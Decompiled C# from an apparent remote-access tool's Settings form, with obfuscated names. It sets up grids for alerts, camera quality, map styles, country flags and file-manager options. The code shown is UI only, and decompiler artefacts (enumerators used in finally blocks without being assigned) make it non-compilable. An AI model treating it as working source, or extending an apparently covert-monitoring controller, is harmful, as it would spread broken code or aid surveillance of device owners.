				{
					panel.BackColor = Module5.color_0;
					panel.ForeColor = Module5.White;
				}
			}
			finally
			{
				IEnumerator<Panel> enumerator4;
				if (enumerator4 != null)
				{
					enumerator4.Dispose();
				}
			}
		}

		// Token: 0x06001222 RID: 4642 RVA: 0x000BC244 File Offset: 0x000BA444
		private void method_2()
		{
			checked
			{
				try
				{
					foreach (DataGridView dataGridView in this.Panel1.Controls.OfType<DataGridView>())
					{
						int num = dataGridView.Rows.Count * dataGridView.Rows[0].Height;
						dataGridView.Height = num + 5;
					}
				}
				finally
				{
					IEnumerator<DataGridView> enumerator;
					if (enumerator != null)
					{
						enumerator.Dispose();
					}
				}
			}
		}

		// Token: 0x06001223 RID: 4643 RVA: 0x000BC2C0 File Offset: 0x000BA4C0
		private void Settings_Load(object sender, EventArgs e)
		{
			base.Icon = Module0.max;
			this.method_1();
			this.method_4();
			this.method_2();
			this.ctxPacket.Renderer = new GClass12();
			this.DGV5.ContextMenuStrip = this.ctxPacket;
			this.TOpacity.Interval = Module5.int_0;
			this.TOpacity.Enabled = true;
		}

		// Token: 0x06001224 RID: 4644 RVA: 0x000BC328 File Offset: 0x000BA528
		private void method_4()
		{
			List<string> list = new List<string>();
			DataGridViewRowCollection rows = this.DGV0.Rows;
			object[] array = new object[2];
			array[0] = "Performance";
			int index = rows.Add(array);
			DataGridViewComboBoxCell dataGridViewComboBoxCell = (DataGridViewComboBoxCell)this.DGV0.Rows[index].Cells[1];
			list.Add("High");
			list.Add("Normal");
			list.Add("Low");
			dataGridViewComboBoxCell.DataSource = list;
			dataGridViewComboBoxCell.Value = list[list.IndexOf(MySettingsProperty.Settings.performance)];
			list = new List<string>();
			DataGridViewRowCollection rows2 = this.DGV0.Rows;
			object[] array2 = new object[2];
			array2[0] = "Encoding";
			index = rows2.Add(array2);
			DataGridViewComboBoxCell dataGridViewComboBoxCell2 = (DataGridViewComboBoxCell)this.DGV0.Rows[index].Cells[1];
			list.Add("Default");
			list.Add("UTF8");
			list.Add("UTF32");
			list.Add("ASCII");
			dataGridViewComboBoxCell2.DataSource = list;
			dataGridViewComboBoxCell2.Value = list[list.IndexOf(MySettingsProperty.Settings.encoding8)];
			list = new List<string>();
			DataGridViewRowCollection rows3 = this.DGV0.Rows;
			object[] array3 = new object[2];
			array3[0] = "Disconnected";
			index = rows3.Add(array3);
			DataGridViewComboBoxCell dataGridViewComboBoxCell3 = (DataGridViewComboBoxCell)this.DGV0.Rows[index].Cells[1];
			list.Add("Close windows");
			list.Add("Just tell me");
			dataGridViewComboBoxCell3.DataSource = list;
			dataGridViewComboBoxCell3.Value = list[list.IndexOf(MySettingsProperty.Settings.disconnected)];
			list = new List<string>();
			DataGridViewRowCollection rows4 = this.DGV0.Rows;
			object[] array4 = new object[2];
			array4[0] = "Removing Duplicates";
			index = rows4.Add(array4);
			DataGridViewComboBoxCell dataGridViewComboBoxCell4 = (DataGridViewComboBoxCell)this.DGV0.Rows[index].Cells[1];
			list.Add("Yes");
			list.Add("No");
			dataGridViewComboBoxCell4.DataSource = list;
			dataGridViewComboBoxCell4.Value = list[list.IndexOf(MySettingsProperty.Settings.Removing_Duplicates)];
			list = new List<string>();
			DataGridViewRowCollection rows5 = this.DGV1.Rows;
			object[] array5 = new object[2];
			array5[0] = "Show Alert";
			index = rows5.Add(array5);
			DataGridViewComboBoxCell dataGridViewComboBoxCell5 = (DataGridViewComboBoxCell)this.DGV1.Rows[index].Cells[1];
			list.Add("Yes");
			list.Add("No");
			dataGridViewComboBoxCell5.DataSource = list;
			dataGridViewComboBoxCell5.Value = list[list.IndexOf(MySettingsProperty.Settings.show_alert)];
			list = new List<string>();
			DataGridViewRowCollection rows6 = this.DGV1.Rows;
			object[] array6 = new object[2];
			array6[0] = "Location";
			index = rows6.Add(array6);
			DataGridViewComboBoxCell dataGridViewComboBoxCell6 = (DataGridViewComboBoxCell)this.DGV1.Rows[index].Cells[1];
			list.Add("Right");
			list.Add("Left");
			dataGridViewComboBoxCell6.DataSource = list;
			dataGridViewComboBoxCell6.Value = list[list.IndexOf(MySettingsProperty.Settings.location)];
			list = new List<string>();
			DataGridViewRowCollection rows7 = this.DGV1.Rows;
			object[] array7 = new object[2];
			array7[0] = "Play Sound";
			index = rows7.Add(array7);
			DataGridViewComboBoxCell dataGridViewComboBoxCell7 = (DataGridViewComboBoxCell)this.DGV1.Rows[index].Cells[1];
			list.Add("Yes");
			list.Add("No");
			dataGridViewComboBoxCell7.DataSource = list;
			dataGridViewComboBoxCell7.Value = list[list.IndexOf(MySettingsProperty.Settings.NOTI_SOUND ? "Yes" : "No")];
			list = new List<string>();
			DataGridViewRowCollection rows8 = this.DGV1.Rows;
			object[] array8 = new object[2];
			array8[0] = "Multi-Sounds";
			index = rows8.Add(array8);
			DataGridViewComboBoxCell dataGridViewComboBoxCell8 = (DataGridViewComboBoxCell)this.DGV1.Rows[index].Cells[1];
			list.Add("Yes");
			list.Add("No");
			dataGridViewComboBoxCell8.DataSource = list;
			dataGridViewComboBoxCell8.Value = list[list.IndexOf(MySettingsProperty.Settings._multi_sounds)];
			list = new List<string>();
			DataGridViewRowCollection rows9 = this.DGV1.Rows;
			object[] array9 = new object[2];
			array9[0] = "Round";
			index = rows9.Add(array9);
			DataGridViewComboBoxCell dataGridViewComboBoxCell9 = (DataGridViewComboBoxCell)this.DGV1.Rows[index].Cells[1];
			list.Add("Yes");
			list.Add("No");
			dataGridViewComboBoxCell9.DataSource = list;
			dataGridViewComboBoxCell9.Value = list[list.IndexOf(MySettingsProperty.Settings.Round)];
			list = new List<string>();
			DataGridViewRowCollection rows10 = this.DGV2.Rows;
			object[] array10 = new object[2];
			array10[0] = "Auto focus";
			index = rows10.Add(array10);
			DataGridViewComboBoxCell dataGridViewComboBoxCell10 = (DataGridViewComboBoxCell)this.DGV2.Rows[index].Cells[1];
			list.Add("Yes");
			list.Add("No");
			dataGridViewComboBoxCell10.DataSource = list;
			dataGridViewComboBoxCell10.Value = list[list.IndexOf(MySettingsProperty.Settings.Auto_focus)];
			list = new List<string>();
			DataGridViewRowCollection rows11 = this.DGV2.Rows;
			object[] array11 = new object[2];
			array11[0] = "Effects";
			index = rows11.Add(array11);
			DataGridViewComboBoxCell dataGridViewComboBoxCell11 = (DataGridViewComboBoxCell)this.DGV2.Rows[index].Cells[1];
			list.Add("Normal");
			list.Add("Gray");
			list.Add("Raw-01");
			list.Add("Raw-02");
			dataGridViewComboBoxCell11.DataSource = list;
			dataGridViewComboBoxCell11.Value = list[list.IndexOf(MySettingsProperty.Settings.Effects_CAM)];
			list = new List<string>();
			DataGridViewRowCollection rows12 = this.DGV2.Rows;
			object[] array12 = new object[2];
			array12[0] = "Quality";
			index = rows12.Add(array12);
			DataGridViewComboBoxCell dataGridViewComboBoxCell12 = (DataGridViewComboBoxCell)this.DGV2.Rows[index].Cells[1];
			list.Add("Auto");
			list.Add("high quality");
			dataGridViewComboBoxCell12.DataSource = list;
			dataGridViewComboBoxCell12.Value = list[list.IndexOf(MySettingsProperty.Settings.CAMQuality)];
			list = new List<string>();
			DataGridViewRowCollection rows13 = this.DGV3.Rows;
			object[] array13 = new object[2];
			array13[0] = "Style";
			index = rows13.Add(array13);
			DataGridViewComboBoxCell dataGridViewComboBoxCell13 = (DataGridViewComboBoxCell)this.DGV3.Rows[index].Cells[1];
			list.Add("Navigation_Preview_Day");
			list.Add("Dark");
			list.Add("Basic_Template");
			list.Add("Streets");
			list.Add("Le_Shine");
			list.Add("Ice_Cream");
			list.Add("Navigation_Preview_Night");
			list.Add("Moonlight");
			list.Add("Decimal");
			dataGridViewComboBoxCell13.DataSource = list;
			dataGridViewComboBoxCell13.Value = list[list.IndexOf(MySettingsProperty.Settings.Style_Maps)];
			list = new List<string>();
			DataGridViewRowCollection rows14 = this.DGV4.Rows;
			object[] array14 = new object[2];
			array14[0] = "Auto save";
			index = rows14.Add(array14);
			DataGridViewComboBoxCell dataGridViewComboBoxCell14 = (DataGridViewComboBoxCell)this.DGV4.Rows[index].Cells[1];
			list.Add("Yes");
			list.Add("No");
			dataGridViewComboBoxCell14.DataSource = list;
			dataGridViewComboBoxCell14.Value = list[list.IndexOf(MySettingsProperty.Settings.Saving_data)];
			Bitmap bitmap = new Bitmap(21, 17);
			Graphics graphics = Graphics.FromImage(bitmap);
			Color color = MySettingsProperty.Settings.DefaultColorForeground;
			graphics.Clear(color);
			Pen pen = new Pen(ControlPaint.Light(MySettingsProperty.Settings.DefaultColorForeground), 1f);
			checked
			{
				graphics.DrawRectangle(pen, 0, 0, bitmap.Width - 1, bitmap.Height - 1);
				index = this.DGV5.Rows.Add(new object[]
				{
					"Foreground",
					bitmap
				});
				this.DGV5.Rows[index].Tag = color;
				graphics.Dispose();
				bitmap = new Bitmap(21, 17);
				graphics = Graphics.FromImage(bitmap);
				color = MySettingsProperty.Settings.DefaultColorBackground;
				graphics.Clear(color);
				pen = new Pen(ControlPaint.Light(MySettingsProperty.Settings.DefaultColorBackground), 1f);
				graphics.DrawRectangle(pen, 0, 0, bitmap.Width - 1, bitmap.Height - 1);
				index = this.DGV5.Rows.Add(new object[]
				{
					"Background",
					bitmap
				});
				this.DGV5.Rows[index].Tag = color;
				graphics.Dispose();
				bitmap = new Bitmap(21, 17);
				graphics = Graphics.FromImage(bitmap);
				color = MySettingsProperty.Settings.DefaultColor_ColorTitles;
				graphics.Clear(color);
				pen = new Pen(ControlPaint.Light(MySettingsProperty.Settings.DefaultColor_ColorTitles), 1f);
				graphics.DrawRectangle(pen, 0, 0, bitmap.Width - 1, bitmap.Height - 1);
				index = this.DGV5.Rows.Add(new object[]
				{
					"Titles",
					bitmap
				});
				this.DGV5.Rows[index].Tag = color;
				graphics.Dispose();
				bitmap = new Bitmap(21, 17);
				graphics = Graphics.FromImage(bitmap);
				color = MySettingsProperty.Settings.DefaultColor_NewColorFiles;
				graphics.Clear(color);
				pen = new Pen(ControlPaint.Light(MySettingsProperty.Settings.DefaultColor_NewColorFiles), 1f);
				graphics.DrawRectangle(pen, 0, 0, bitmap.Width - 1, bitmap.Height - 1);
				index = this.DGV5.Rows.Add(new object[]
				{
					"New Files",
					bitmap
				});
				this.DGV5.Rows[index].Tag = color;
				graphics.Dispose();
				list = new List<string>();
				DataGridViewRowCollection rows15 = this.DGV6.Rows;
				object[] array15 = new object[2];
				array15[0] = "Size";
				index = rows15.Add(array15);
				DataGridViewComboBoxCell dataGridViewComboBoxCell15 = (DataGridViewComboBoxCell)this.DGV6.Rows[index].Cells[1];
				list.Add("8");
				list.Add("9");
				list.Add("10");
				list.Add("11");
				list.Add("12");
				dataGridViewComboBoxCell15.DataSource = list;
				dataGridViewComboBoxCell15.Value = list[list.IndexOf(Conversions.ToString(MySettingsProperty.Settings.FontSize))];
				list = new List<string>();
				DataGridViewRowCollection rows16 = this.DGV6.Rows;
				object[] array16 = new object[2];
				array16[0] = "Style";
				index = rows16.Add(array16);
				DataGridViewComboBoxCell dataGridViewComboBoxCell16 = (DataGridViewComboBoxCell)this.DGV6.Rows[index].Cells[1];
				list.Add("Bold");
				list.Add("Regular");
				dataGridViewComboBoxCell16.DataSource = list;
				dataGridViewComboBoxCell16.Value = list[list.IndexOf(MySettingsProperty.Settings.FontStyle)];
				list = new List<string>();
				DataGridViewRowCollection rows17 = this.DGV7.Rows;
				object[] array17 = new object[2];
				array17[0] = "Visible";
				index = rows17.Add(array17);
				DataGridViewComboBoxCell dataGridViewComboBoxCell17 = (DataGridViewComboBoxCell)this.DGV7.Rows[index].Cells[1];
				list.Add("Yes");
				list.Add("No");
				dataGridViewComboBoxCell17.DataSource = list;
				dataGridViewComboBoxCell17.Value = list[list.IndexOf(MySettingsProperty.Settings.Flags_Visible)];
				list = new List<string>();
				DataGridViewRowCollection rows18 = this.DGV7.Rows;
				object[] array18 = new object[2];
				array18[0] = "Size";
				index = rows18.Add(array18);
				DataGridViewComboBoxCell dataGridViewComboBoxCell18 = (DataGridViewComboBoxCell)this.DGV7.Rows[index].Cells[1];
				list.Add("16px");
				list.Add("24px");
				list.Add("32px");
				dataGridViewComboBoxCell18.DataSource = list;
				dataGridViewComboBoxCell18.Value = list[list.IndexOf(MySettingsProperty.Settings.Flags_Size)];
				list = new List<string>();
				DataGridViewRowCollection rows19 = this.DGV8.Rows;
				object[] array19 = new object[2];
				array19[0] = "Visible";
				index = rows19.Add(array19);
				DataGridViewComboBoxCell dataGridViewComboBoxCell19 = (DataGridViewComboBoxCell)this.DGV8.Rows[index].Cells[1];
				list.Add("Yes");
				list.Add("No");
				dataGridViewComboBoxCell19.DataSource = list;
				dataGridViewComboBoxCell19.Value = list[list.IndexOf(MySettingsProperty.Settings.SStatus_Visible)];
				list = new List<string>();
				DataGridViewRowCollection rows20 = this.DGV9.Rows;
				object[] array20 = new object[2];
				array20[0] = "Icon files size";
				index = rows20.Add(array20);
				DataGridViewComboBoxCell dataGridViewComboBoxCell20 = (DataGridViewComboBoxCell)this.DGV9.Rows[index].Cells[1];
				list.Add("Small");
				list.Add("Large");
				dataGridViewComboBoxCell20.DataSource = list;
				dataGridViewComboBoxCell20.Value = list[list.IndexOf(MySettingsProperty.Settings.FM_IC_Size)];
				this.DGV0.ClearSelection();
				this.DGV1.ClearSelection();
				this.DGV2.ClearSelection();
				this.DGV3.ClearSelection();
				this.DGV4.ClearSelection();
				this.DGV5.ClearSelection();
				this.DGV6.ClearSelection();
				this.DGV7.ClearSelection();
				this.DGV8.ClearSelection();
				this.DGV9.ClearSelection();
			}
		}

		// Token: 0x06001225 RID: 4645 RVA: 0x000BD1C8 File Offset: 0x000BB3C8
		private void SV_Click(object sender, EventArgs e)
		{
			int num = 0;
			checked
			{
				try
				{
					foreach (object obj in ((IEnumerable)this.DGV0.Rows))
					{
						object objectValue = RuntimeHelpers.GetObjectValue(obj);
						switch (num)
						{
						case 0:
							MySettingsProperty.Settings.performance = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, null, "Cells", new object[]
							{
								1
							}, null, null, null), null, "Value", new object[0], null, null, null));
							break;
						case 1:
							MySettingsProperty.Settings.encoding8 = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, null, "Cells", new object[]
							{
								1
							}, null, null, null), null, "Value", new object[0], null, null, null));
							break;
						case 2:
							MySettingsProperty.Settings.disconnected = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, null, "Cells", new object[]
							{
								1
							}, null, null, null), null, "Value", new object[0], null, null, null));
							break;
						case 3:
							MySettingsProperty.Settings.Removing_Duplicates = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, null, "Cells", new object[]
							{
								1
							}, null, null, null), null, "Value", new object[0], null, null, null));
							break;
						}
						num++;
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				num = 0;
				try
				{
					foreach (object obj2 in ((IEnumerable)this.DGV1.Rows))
					{
						object objectValue2 = RuntimeHelpers.GetObjectValue(obj2);
						switch (num)
						{
						case 0:
							MySettingsProperty.Settings.show_alert = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue2, null, "Cells", new object[]
							{
								1
							}, null, null, null), null, "Value", new object[0], null, null, null));
							break;
						case 1:
							MySettingsProperty.Settings.location = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue2, null, "Cells", new object[]
							{
								1
							}, null, null, null), null, "Value", new object[0], null, null, null));
							break;
						case 2:
							MySettingsProperty.Settings.NOTI_SOUND = Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue2, null, "Cells", new object[]
							{
								1
							}, null, null, null), null, "Value", new object[0], null, null, null), "Yes", false);
							break;
						case 3:
							MySettingsProperty.Settings._multi_sounds = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue2, null, "Cells", new object[]
							{
								1
							}, null, null, null), null, "Value", new object[0], null, null, null));
							break;
						case 4:
							MySettingsProperty.Settings.Round = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue2, null, "Cells", new object[]
							{
								1
							}, null, null, null), null, "Value", new object[0], null, null, null));
							break;
						}
						num++;
					}
				}
				finally
				{
					IEnumerator enumerator2;
					if (enumerator2 is IDisposable)
					{
						(enumerator2 as IDisposable).Dispose();
					}
				}
				num = 0;
				try
				{
					foreach (object obj3 in ((IEnumerable)this.DGV2.Rows))
					{
						object objectValue3 = RuntimeHelpers.GetObjectValue(obj3);
						switch (num)
						{
						case 0:
							MySettingsProperty.Settings.Auto_focus = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue3, null, "Cells", new object[]
							{
								1
							}, null, null, null), null, "Value", new object[0], null, null, null));
							break;
						case 1:
							MySettingsProperty.Settings.Effects_CAM = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue3, null, "Cells", new object[]
							{
								1
							}, null, null, null), null, "Value", new object[0], null, null, null));
							break;
						case 2:
							MySettingsProperty.Settings.CAMQuality = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue3, null, "Cells", new object[]
							{
								1
							}, null, null, null), null, "Value", new object[0], null, null, null));
							break;
						}
						num++;
					}
				}
				finally
				{
					IEnumerator enumerator3;
					if (enumerator3 is IDisposable)
					{
						(enumerator3 as IDisposable).Dispose();
					}
				}
				num = 0;
				try
				{
					foreach (object obj4 in ((IEnumerable)this.DGV3.Rows))
					{
						object objectValue4 = RuntimeHelpers.GetObjectValue(obj4);
						if (num == 0)
						{
							MySettingsProperty.Settings.Style_Maps = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue4, null, "Cells", new object[]
							{
								1
							}, null, null, null), null, "Value", new object[0], null, null, null));
						}
						num++;
					}
				}
				finally
				{
					IEnumerator enumerator4;
					if (enumerator4 is IDisposable)
					{
						(enumerator4 as IDisposable).Dispose();
					}
				}
				num = 0;
				try
				{
					foreach (object obj5 in ((IEnumerable)this.DGV4.Rows))
					{
						object objectValue5 = RuntimeHelpers.GetObjectValue(obj5);
						if (num == 0)
						{
							MySettingsProperty.Settings.Saving_data = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue5, null, "Cells", new object[]
							{
								1
							}, null, null, null), null, "Value", new object[0], null, null, null));
						}
						num++;
					}
				}
				finally
				{
					IEnumerator enumerator5;
					if (enumerator5 is IDisposable)
					{
						(enumerator5 as IDisposable).Dispose();
					}
				}
				num = 0;
				try
				{
					foreach (object obj6 in ((IEnumerable)this.DGV5.Rows))
					{
						object objectValue6 = RuntimeHelpers.GetObjectValue(obj6);
						switch (num)
						{
						case 0:
							MySettingsProperty.Settings.DefaultColorForeground = (Color)NewLateBinding.LateGet(objectValue6, null, "Tag", new object[0], null, null, null);
							break;
						case 1:
							MySettingsProperty.Settings.DefaultColorBackground = (Color)NewLateBinding.LateGet(objectValue6, null, "Tag", new object[0], null, null, null);
							break;
						case 2:
							MySettingsProperty.Settings.DefaultColor_ColorTitles = (Color)NewLateBinding.LateGet(objectValue6, null, "Tag", new object[0], null, null, null);
							break;
						case 3:
							MySettingsProperty.Settings.DefaultColor_NewColorFiles = (Color)NewLateBinding.LateGet(objectValue6, null, "Tag", new object[0], null, null, null);
							break;
						}
						num++;
					}
				}
				finally
				{
					IEnumerator enumerator6;
					if (enumerator6 is IDisposable)
					{
						(enumerator6 as IDisposable).Dispose();
					}
				}
				num = 0;
				try
				{
					foreach (object obj7 in ((IEnumerable)this.DGV6.Rows))
					{
						object objectValue7 = RuntimeHelpers.GetObjectValue(obj7);
						if (num != 0)
						{
							if (num == 1)
							{
								MySettingsProperty.Settings.FontStyle = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue7, null, "Cells", new object[]
								{
									1
								}, null, null, null), null, "Value", new object[0], null, null, null));
							}
						}
						else
						{
							MySettingsProperty.Settings.FontSize = Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue7, null, "Cells", new object[]
							{
								1
							}, null, null, null), null, "Value", new object[0], null, null, null));
						}
						num++;
					}
				}
				finally
				{
					IEnumerator enumerator7;
					if (enumerator7 is IDisposable)
					{
						(enumerator7 as IDisposable).Dispose();
					}
				}
				num = 0;
				try
				{
					foreach (object obj8 in ((IEnumerable)this.DGV7.Rows))
					{
						object objectValue8 = RuntimeHelpers.GetObjectValue(obj8);
						if (num != 0)
						{
							if (num == 1)
							{
								MySettingsProperty.Settings.Flags_Size = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue8, null, "Cells", new object[]
								{
									1
								}, null, null, null), null, "Value", new object[0], null, null, null));
							}
						}
						else
						{
							MySettingsProperty.Settings.Flags_Visible = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue8, null, "Cells", new object[]
							{
								1
							}, null, null, null), null, "Value", new object[0], null, null, null));
						}
						num++;
					}
				}
				finally
				{
					IEnumerator enumerator8;
					if (enumerator8 is IDisposable)
					{
						(enumerator8 as IDisposable).Dispose();
					}
				}
				num = 0;
				try
				{
					foreach (object obj9 in ((IEnumerable)this.DGV8.Rows))
					{
						object objectValue9 = RuntimeHelpers.GetObjectValue(obj9);
						if (num == 0)
						{
							MySettingsProperty.Settings.SStatus_Visible = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue9, null, "Cells", new object[]
							{
								1
							}, null, null, null), null, "Value", new object[0], null, null, null));
						}
						num++;
					}
				}
				finally
				{
					IEnumerator enumerator9;
					if (enumerator9 is IDisposable)
					{
						(enumerator9 as IDisposable).Dispose();
					}
				}
				num = 0;
				try
				{
					foreach (object obj10 in ((IEnumerable)this.DGV9.Rows))
					{
						object objectValue10 = RuntimeHelpers.GetObjectValue(obj10);
						if (num == 0)
						{
							MySettingsProperty.Settings.FM_IC_Size = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue10, null, "Cells", new object[]
							{
								1
							}, null, null, null), null, "Value", new object[0], null, null, null));
						}
						num++;
					}
				}
				finally
				{
					IEnumerator enumerator10;
					if (enumerator10 is IDisposable)
					{
						(enumerator10 as IDisposable).Dispose();
					}
				}
				MySettingsProperty.Settings.Save();
				Interaction.MsgBox("Saved Changes will be made after restarting the program", MsgBoxStyle.Information, Module8.string_5);
				base.Close();
			}
		}

		// Token: 0x06001226 RID: 4646 RVA: 0x000BDC68 File Offset: 0x000BBE68
		private void DL_Click(object sender, EventArgs e)
		{
			MySettingsProperty.Settings.Reset();
			this.DGV0.Rows.Clear();
			this.DGV1.Rows.Clear();
			this.DGV2.Rows.Clear();
			this.DGV3.Rows.Clear();
			this.DGV4.Rows.Clear();
			this.DGV5.Rows.Clear();
			this.DGV6.Rows.Clear();
			this.DGV7.Rows.Clear();
			this.DGV8.Rows.Clear();
			this.DGV9.Rows.Clear();
			this.method_4();
		}

		// Token: 0x06001227 RID: 4647 RVA: 0x000BDD28 File Offset: 0x000BBF28
		private void method_7(DataGridView dataGridView_0)
		{
			try
			{
				foreach (DataGridView dataGridView in this.Panel1.Controls.OfType<DataGridView>())
				{
					if (Operators.CompareString(dataGridView.Name, dataGridView_0.Name, false) != 0 && dataGridView.Rows.Count > 0)
					{
						dataGridView.CurrentCell = dataGridView.Rows[0].Cells[0];
						dataGridView.ClearSelection();
					}
				}
			}
			finally
			{
				IEnumerator<DataGridView> enumerator;
				if (enumerator != null)
				{
					enumerator.Dispose();
				}
			}
		}

		// Token: 0x06001228 RID: 4648 RVA: 0x000BDDC4 File Offset: 0x000BBFC4
		private void DGV0_CellEnter(object sender, DataGridViewCellEventArgs e)
		{
			this.method_7(this.DGV0);
		}

		// Token: 0x06001229 RID: 4649 RVA: 0x000BDDE0 File Offset: 0x000BBFE0
		private void DGV1_CellEnter(object sender, DataGridViewCellEventArgs e)
		{
			this.method_7(this.DGV1);
		}

		// Token: 0x0600122A RID: 4650 RVA: 0x000BDDFC File Offset: 0x000BBFFC
		private void DGV2_CellEnter(object sender, DataGridViewCellEventArgs e)
		{
			this.method_7(this.DGV2);
		}

		// Token: 0x0600122B RID: 4651 RVA: 0x000BDE18 File Offset: 0x000BC018
		private void DGV3_CellEnter(object sender, DataGridViewCellEventArgs e)
		{
			this.method_7(this.DGV3);
		}

		// Token: 0x0600122C RID: 4652 RVA: 0x000BDE34 File Offset: 0x000BC034
		private void DGV4_CellEnter(object sender, DataGridViewCellEventArgs e)
		{
			this.method_7(this.DGV4);
		}

		// Token: 0x0600122D RID: 4653 RVA: 0x000BDE50 File Offset: 0x000BC050
		private void DGV5_CellEnter(object sender, DataGridViewCellEventArgs e)
		{
			this.method_7(this.DGV5);
		}

		// Token: 0x0600122E RID: 4654 RVA: 0x000BDE6C File Offset: 0x000BC06C
		private void DGV6_CellEnter(object sender, DataGridViewCellEventArgs e)
		{
			this.method_7(this.DGV6);
		}

		// Token: 0x0600122F RID: 4655 RVA: 0x000BDE88 File Offset: 0x000BC088
		private void DGV7_CellEnter(object sender, DataGridViewCellEventArgs e)
		{
			this.method_7(this.DGV7);
		}

		// Token: 0x06001230 RID: 4656 RVA: 0x000BDEA4 File Offset: 0x000BC0A4
		private void DGV8_CellEnter(object sender, DataGridViewCellEventArgs e)
		{
			this.method_7(this.DGV8);
		}

		// Token: 0x06001231 RID: 4657 RVA: 0x000BDEC0 File Offset: 0x000BC0C0
		private void DGV9_CellEnter(object sender, DataGridViewCellEventArgs e)
		{
			this.method_7(this.DGV9);
		}

		// Token: 0x06001232 RID: 4658 RVA: 0x000BDEDC File Offset: 0x000BC0DC
		private void DGV5_CellContentClick(object sender, DataGridViewCellEventArgs e)
		{
			checked
			{
				if ((e.RowIndex == 0 | e.RowIndex == 1 | e.RowIndex == 2 | e.RowIndex == 3) && e.ColumnIndex == 1)
				{
					Color_Box0 color_Box = new Color_Box0();
					if (color_Box.ShowDialog() == DialogResult.OK)
					{
						Bitmap bitmap = new Bitmap(21, 17);
						Graphics graphics = Graphics.FromImage(bitmap);
						Color backColor = color_Box.C_Box3.BackColor;
						graphics.Clear(backColor);
						Pen pen = new Pen(ControlPaint.Light(backColor), 1f);
						graphics.DrawRectangle(pen, 0, 0, bitmap.Width - 1, bitmap.Height - 1);
						this.DGV5.Rows[e.RowIndex].Tag = backColor;
						this.DGV5.Rows[e.RowIndex].Cells[1].Value = bitmap;
						graphics.Dispose();
					}
					color_Box.Close();
				}
			}
		}

		// Token: 0x06001233 RID: 4659 RVA: 0x000BDFE0 File Offset: 0x000BC1E0
		private void method_19(Color[] colors_0)
		{
			int num = 0;
			checked
			{
				try
				{
					foreach (object obj in ((IEnumerable)this.DGV5.Rows))
					{
						object objectValue = RuntimeHelpers.GetObjectValue(obj);
						DataGridViewRow dataGridViewRow = (DataGridViewRow)objectValue;
						Bitmap bitmap = new Bitmap(21, 17);
						Graphics graphics = Graphics.FromImage(bitmap);
						Color color = colors_0[num];
						graphics.Clear(color);
						Pen pen = new Pen(ControlPaint.Light(color), 1f);
						graphics.DrawRectangle(pen, 0, 0, bitmap.Width - 1, bitmap.Height - 1);
						dataGridViewRow.Tag = color;
						dataGridViewRow.Cells[1].Value = bitmap;
						graphics.Dispose();
						num++;
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x06001234 RID: 4660 RVA: 0x0000246D File Offset: 0x0000066D
		private void DGV1_CellContentClick(object sender, DataGridViewCellEventArgs e)
		{
		}

		// Token: 0x06001235 RID: 4661 RVA: 0x000BE0D4 File Offset: 0x000BC2D4
		private void DefaultToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Color[] colors_ = new Color[]
			{
				Color.FromArgb(106, 106, 106),
				Color.FromArgb(206, 206, 206),
				Color.FromArgb(70, 130, 180),
				Color.FromArgb(95, 158, 160)
			};
			this.method_19(colors_);
		}

		// Token: 0x06001236 RID: 4662 RVA: 0x000BE14C File Offset: 0x000BC34C
		private void clr_1_Click(object sender, EventArgs e)
		{
			Color[] colors_ = new Color[]
			{
				Color.FromArgb(45, 156, 202),
				Color.FromArgb(37, 39, 77),
				Color.FromArgb(169, 171, 184),
				Color.FromArgb(159, 64, 103)
			};
			this.method_19(colors_);
		}

		// Token: 0x06001237 RID: 4663 RVA: 0x000BE1C4 File Offset: 0x000BC3C4
		private void clr_2_Click(object sender, EventArgs e)
		{
			Color[] colors_ = new Color[]
			{
				Color.FromArgb(55, 176, 169),
				Color.FromArgb(222, 242, 241),
				Color.FromArgb(43, 122, 119),
				Color.FromArgb(23, 36, 42)
			};
			this.method_19(colors_);
		}

		// Token: 0x06001238 RID: 4664 RVA: 0x000BE238 File Offset: 0x000BC438
		private void Clr3ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Color[] colors_ = new Color[]
			{
				Color.FromArgb(47, 68, 85),
				Color.FromArgb(220, 220, 220),
				Color.FromArgb(84, 102, 116),
				Color.FromArgb(218, 123, 147)
			};
			this.method_19(colors_);
		}

		// Token: 0x06001239 RID: 4665 RVA: 0x000BE2AC File Offset: 0x000BC4AC
		private void Clr4ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Color[] colors_ = new Color[]
			{
				Color.FromArgb(217, 63, 135),
				Color.FromArgb(42, 27, 60),
				Color.FromArgb(130, 101, 167),
				Color.FromArgb(68, 49, 141)
			};
			this.method_19(colors_);
		}

		// Token: 0x0600123A RID: 4666 RVA: 0x000BE320 File Offset: 0x000BC520
		private void Clr5ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Color[] colors_ = new Color[]
			{
				Color.FromArgb(61, 61, 61),
